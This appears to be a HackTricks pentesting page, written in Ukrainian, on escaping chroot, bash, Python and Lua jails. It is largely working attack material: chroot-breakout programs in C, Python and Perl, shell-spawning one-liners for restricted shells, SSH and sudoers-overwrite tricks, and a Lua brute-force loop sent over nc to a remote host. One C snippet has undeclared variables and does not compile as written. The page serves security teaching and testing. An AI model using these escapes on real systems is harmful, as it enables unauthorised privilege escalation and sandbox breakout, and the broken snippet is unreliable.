# Втеча з Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Пошукайте на** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **чи можете ви виконати будь-який binary з властивістю "Shell"**

## Chroot Escapes

З [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): механізм chroot **не призначений для захисту** від навмисного втручання з боку **привілейованих** (**root**) **користувачів**. У більшості систем контексти chroot не вкладаються належним чином, і програми в chroot **з достатніми привілеями можуть виконати другий chroot, щоб вирватися**.\
Зазвичай це означає, що для втечі вам потрібно бути root всередині chroot.

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) був створений для зловживання наведеними нижче escenarios і втечі з `chroot`.

### Root + CWD

> [!WARNING]
> Якщо ви **root** всередині chroot, ви **можете втекти**, створивши **ще один chroot**. Це тому, що 2 chroot не можуть співіснувати (у Linux), тож якщо ви створите папку, а потім **створите новий chroot** на цій новій папці, будучи **зовні від неї**, то ви опинитеся **зовні нового chroot** і, отже, будете у FS.
>
> Це відбувається тому, що зазвичай chroot НЕ переміщує ваш робочий каталог до вказаного, тож ви можете створити chroot, але залишитися поза ним.

Зазвичай у chroot jail ви не знайдете binary `chroot`, але ви **можете скомпілювати, завантажити та виконати** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Це схоже на попередній випадок, але тут **attacker зберігає file descriptor до поточного каталогу** і потім **створює chroot у новій папці**. Нарешті, оскільки він має **access** до цього **FD** **поза** chroot, він отримує до нього доступ і **escapes**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Get info about the jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modify PATH

Перевірте, чи можете ви змінити змінну середовища PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim
```bash
:set shell=/bin/sh
:shell
```
### Пейджери та переглядачі довідки

У багатьох обмежених середовищах усе ще доступні **pagers** або **help viewers**. Ними зазвичай швидше зловживати, ніж намагатися перебудувати `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Якщо `git` доступний, пам’ятайте, що його вивід help зазвичай проходить через pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Поширені one-liners GTFOBins

Після того як ви знаєте, які binaries reachable, спершу перевірте очевидні shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Якщо ви можете лише **inject arguments** в дозволену команду (замість вільного запуску), також перевірте **GTFOArgs**.

### Створіть script

Перевірте, чи можете ви створити виконуваний файл з _/bin/bash_ як вмістом
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримати bash через SSH

Якщо ви отримуєте доступ через ssh, ви часто можете попросити сервер виконати **іншу програму** замість обмеженої login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Якщо `ssh` — це один із небагатьох локально дозволених binaries, пам’ятайте, що його також можна зловживати як **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Оголосити
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Ви можете перезаписати, наприклад, файл sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Деякі середовища не кидають вас у звичайний `rbash`, а у **wrappers** на кшталт `git-shell`, `rssh` або `lshell`:

- `git-shell` приймає лише server-side Git commands плюс усе, що є всередині `~/git-shell-commands/`. Якщо цей каталог існує, запустіть `help`, щоб перелічити дозволені custom actions. Якщо ви можете туди **писати**, будь-який executable, скинутий у цей каталог, стане доступним.
- `rssh` / `lshell` зазвичай дозволяють лише `scp`, `sftp`, `rsync` або Git-style operations. У таких випадках спершу зосередьтеся на **file write primitives**: завантажте `authorized_keys`, shell startup file або helper script у writable location, а потім перепідключіться з `ssh -t ...`.
- Якщо wrapper лише фільтрує command line, перелічіть reachable binaries, а потім pivot back до **GTFOBins / GTFOArgs**.

### Other tricks

Також перевірте:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Також може бути цікава сторінка:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Прийоми для escaping from python jails на наступній сторінці:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

На цій сторінці ви знайдете global functions, до яких маєте доступ у lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Деякі трюки, щоб **викликати functions бібліотеки без використання крапок**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Перелічити функції бібліотеки:
```bash
for k,v in pairs(string) do print(k,v) end
```
Зауважте, що кожного разу, коли ви виконуєте попередній one liner в **іншому lua environment, порядок functions змінюється**. Тому, якщо вам потрібно виконати одну конкретну function, ви можете провести brute force attack, завантажуючи різні lua environments і викликаючи першу function of le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримати інтерактивний lua shell**: Якщо ви перебуваєте всередині обмеженого lua shell, ви можете отримати новий lua shell (і, сподіваємось, без обмежень), викликавши:
```bash
debug.debug()
```
## References

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
